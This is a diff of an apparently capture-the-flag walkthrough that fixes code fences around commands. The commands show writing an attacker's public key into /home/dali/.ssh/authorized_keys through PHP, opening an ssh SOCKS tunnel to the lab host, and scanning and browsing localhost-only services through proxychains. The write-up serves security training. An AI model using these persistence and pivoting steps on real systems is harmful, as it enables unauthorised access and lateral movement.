@@ -15,27 +15,27 @@ fwrite(fopen("/home/dali/.ssh/authorized_keys","w+"),base64_decode("PAYLOADENBAS
 
 Now we can log it using ssh to test the id_rsa we generated before, but we are not doing any command stuff, we just use it to enable a dynamic tunnel with the machine.
 
-'''
+```
 $>ssh -i id_rsa -D 1080 dali@10.10.10.131
-'''
+```
 
 In other terminal, using proxychains we can scan the ports that are open only for local connections
 
-'''
+```
 $>proxychains nmap -sT -n -Pn 127.0.0.1 -p-
 
 PORT     STATE SERVICE
 8000/tcp open  http-alt
-'''
+```
 
 Port 8000 is open, and if we scan it we can see that is a web server, is the same webserver we can browse if we use the intented way of entering the machine, but locally we don't need any certificate.
 
-'''
+```
 $>proxychains curl 127.0.0.1:8000
 ProxyChains-3.1 (http://proxychains.sf.net)
 |S-chain|-<>-127.0.0.1:1080-<><>-127.0.0.1:8000-<><>-OK
 <li><a href="?path=SEASON-1">SEASON-1</a></li><li><a href="?path=SEASON-2">SEASON-2</a></li><li><strong>Select a season</strong></li>
-'''
+```
 
 You have here also a python script to upload a public key and the private id_rsa file to enable the dynamic tunnel
 
